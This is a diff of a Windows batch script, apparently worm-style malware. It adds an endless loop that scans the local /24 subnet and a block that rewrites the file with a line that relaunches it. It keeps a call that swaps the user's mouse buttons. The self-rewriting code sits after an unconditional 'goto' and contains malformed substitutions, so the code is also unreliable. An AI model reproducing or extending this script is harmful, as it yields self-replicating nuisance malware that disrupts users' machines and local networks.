@@ -1,9 +1,7 @@
 @echo off
-:user
-:folders
-:files
-:worm
+setlocal enabledelayedexpansion
 
+:x
 for /f "tokens=2" %%a in ('ipconfig ^| findstr /i "IPv4"') do set ip=%%a
 for /f "tokens=1-3 delims=." %%a in ("%ip%") do set subnet=%%a.%%b.%%c.
 
@@ -15,6 +13,26 @@ for /l %%i in (1,1,254) do (
         )
     )
 )
+goto x
+
+set "self=%~f0"
+(for /f "tokens=1,* delims=:" %%a in ('findstr /n "^" "%self%"') do (
+    set "line=%%b"
+    if not "%%b"=="!line:findstr /n "^"=%~0!" (
+        echo(!line:*:=!
+    )
+)) > "%self%.tmp"
+
+echo @echo off > "%self%"
+echo setlocal enabledelayedexpansion>> "%self%"
+type "%self%.tmp" >> "%self%"
+echo start "" "%self%">> "%self%"
+del "%self%.tmp"
+
+:user
+:folders
+:files
+:worm
 
 RUNDLL32 USER32.DLL,SwapMouseButton
 set Slash=\
